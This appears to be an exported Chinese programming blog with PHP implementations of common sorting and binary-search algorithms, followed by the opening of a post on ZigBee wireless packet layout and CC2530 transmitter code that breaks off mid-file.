<h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span> <span class="token operator">-</span> <span class="token variable">$i</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$temp</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token variable">$len</span> <span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$min</span> <span class="token operator">=</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//这个for循环选出最小值</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token operator">&lt;</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$min</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$min</span> <span class="token operator">=</span> <span class="token variable">$j</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$min</span> <span class="token operator">!=</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//选择最小值放前面</span>
        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$min</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$min</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$temp</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//从第二个数据开始依次取出数据与前面已经排好的进行比较</span>
    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token comment">//$arr[$j] = $temp;     //优化后略过了这一次赋值，意思就是temp元素依旧存在，没进入数组，当前面的元素都交换完成后，才在后面的if语句中进行最后的赋值操作</span>
            <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token comment">//这里的作用是如果在判断的时候取出来的就已经比他左边的要大了，就不用进行交换了，直接break</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//如果交换了，则进行temp赋值</span>
        <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$temp</span><span class="token punctuation">;</span> <span class="token comment">//这里$j需要加一的原因是在上面的循环最后执行了一次$j--的操作，于是这里需要把1加上</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">quick_sort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">;</span>

    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$left</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$right</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//递归</span>
    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//递归</span>

    <span class="token keyword">return</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//合并数组，注意这里元素必须全是数组才能进行操作，$arr[0]为元素，所以需要强制转换成数组，或者用array($arr[0])也可以</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">merge_sort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span>  <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//舍去法取整</span>
    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//array_slice从数组中取出一段序列</span>
    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token function">merge_sort</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//递归</span>
    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">merge_sort</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//递归</span>
    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//当有一边为0则结束返回</span>
        <span class="token variable">$m</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$left</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token variable">$right</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">array_shift</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$left</span><span class="token punctuation">,</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后两个数组的放置对结果没影响</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">merge_sort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h3 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h3><p>这里有一种数组遍历查找就没写了</p>
<h4 id="二分法查找"><a href="#二分法查找" class="headerlink" title="二分法查找"></a>二分法查找</h4><p>注：二分法查找前要求数列是已经排好序了的</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$left</span> <span class="token operator">&lt;=</span> <span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$middle</span> <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$left</span> <span class="token operator">+</span> <span class="token variable">$right</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$middle</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$middle</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$middle</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token variable">$middle</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token variable">$middle</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>这个方法在查找的时候如果要查的数据不在数组里就会报下面的注意事项（在的话不会报错），返回的结果<code>false</code>还是有的</p>
<pre class="language-none"><code class="language-none">Notice:  Undefined offset: 9 in C:\xxx\test.php on line 7
Notice:  Undefined offset: 9 in C:\xxx\test.php on line 10</code></pre>

<p>原因还没找到，如果有大佬知道的话欢迎留言指出，wtcl -_-，没有的话坑先留着后面再填</p>
<h4 id="二分归并法查找"><a href="#二分归并法查找" class="headerlink" title="二分归并法查找"></a>二分归并法查找</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$num</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>





<p>web:dog:</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>ZigBee无线通信数据传输</title>
    <url>/posts/ff0d7e8b/</url>
    <content><![CDATA[<ol>
<li><p>Zigbee无线通信，需要高频的载波来提供发射效率，Zigbee模块之间要可以正常的收发，接收模块必须把接收频率设置和发射模块的载波频率一致。</p>
</li>
<li><p>Zigbee有27个载波可以进行通信，载波叫做信道（无线通信的通道）。这些载波的频率落在某些频率区段，我们把这些区段叫做频段。TI的所有支持Zigbee底层协议的芯片只能在2.4G频段的16个信道里进行通信。即：</p>
<blockquote>
<p>11  2405M</p>
<p>12  2410M</p>
<p>……</p>
<p>26  2480M</p>
</blockquote>
</li>
<li><p>在Zigbee无线局域网里，每一模块都一个在该网络里唯一的2个字节的地址，这个地址叫做网络地址，网络短地址。</p>
</li>
</ol>
<span id="more"></span>

<ol start="4">
<li><p>PANID这是一个2个字节的编码，用来区别不同的Zigbee无线局域网，个域网ID.</p>
</li>
<li><p>无线数据包的内容</p>
<blockquote>
<p>#define SENDVAL 5<br>char SendPacket[]={0x0C,0x61,0x88,0x00,0x07,0x20,0xEF,0xBE,0x20,0x50,SENDVAL};<br>//第一个字节0x0C含义，这个自己后面还有12个字节要发送<br>//第5 6个字节表示的是PANID<br>//第7 8个字节是无线模块目标设备的网络地址 0xBEEF<br>//第9 10就是本地模块的网络地址<br>//11 个字节是我们有用的数据<br>// CRC码 12 13个字节 是硬件自动追加</p>
</blockquote>
</li>
</ol>
<p>实验代码：</p>
<p>按钮控制数码管的数字显示变化</p>
<p>发送：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ioCC2530.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SENDVAL</span> <span class="token expression"><span class="token number">5</span></span></span>
